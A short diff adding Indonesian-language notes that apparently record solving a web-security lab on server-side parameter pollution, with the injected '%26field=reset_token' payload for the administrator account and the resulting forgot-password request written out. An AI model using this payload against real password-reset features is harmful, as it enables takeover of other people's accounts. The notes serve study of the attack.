@@ -1,0 +1,8 @@
+
+
+// Exploiting server-side parameter pollution in a query string // 
+
+di case kali ini cuman coba eksploitasi fitur reset password yang ada, method post yang bisa digunakan itu ada GET,POST
+
+&username=administrator%26field=reset_token      | field nya di bruteforce, terus reset_token nya dari endpoint.js yang di fitur forget password
+GET /forgot-password?reset_token=523kcujjrtoppxhjcr071631jvdr64zl
